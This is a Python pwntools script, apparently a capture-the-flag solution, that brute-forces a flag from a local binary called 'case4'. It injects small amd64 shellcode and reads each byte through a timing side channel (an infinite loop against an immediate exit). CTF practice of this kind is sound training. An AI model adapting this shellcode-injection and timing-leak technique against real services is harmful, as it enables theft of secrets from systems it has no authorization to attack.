from pwn import *

import os
import time


flag = 'Cup{'
cur_flag_idx = 4
context.clear( arch="amd64" )
payload = """
                  nop
                  nop
                  nop
                  cmp BYTE PTR [rdi+%d], %s
                  jz _exit
                _lock:
                  jmp _lock
                _exit:
                  mov al, 60
                  syscall"""

if __name__ == "__main__":

    alph = "abcdef0123456789}"

    for index in range( cur_flag_idx, 69 ):
        
        for char in alph:
            
            cur_payload = payload % ( index, hex( ord( char ) ) )
            cur_payload = asm( cur_payload )

            p = process( "./case4" )
            # gdb.attach( p, 
            #     '''file case4
            #     b *run_code+175''' )

            p.recvuntil( ": " )

            t_start = time.time()
            p.send( cur_payload + '\n' )

            while 1:
                p.settimeout( 0.5 )
                try:
                    p.recv()
                except:
                    break

            p.close()

            t_end = time.time()

            brute_time = round( t_end - t_start )
            print "brute_time: %d" % brute_time

            if brute_time != 2:
                flag += char
                print flag
                break

                
        sleep( 2 )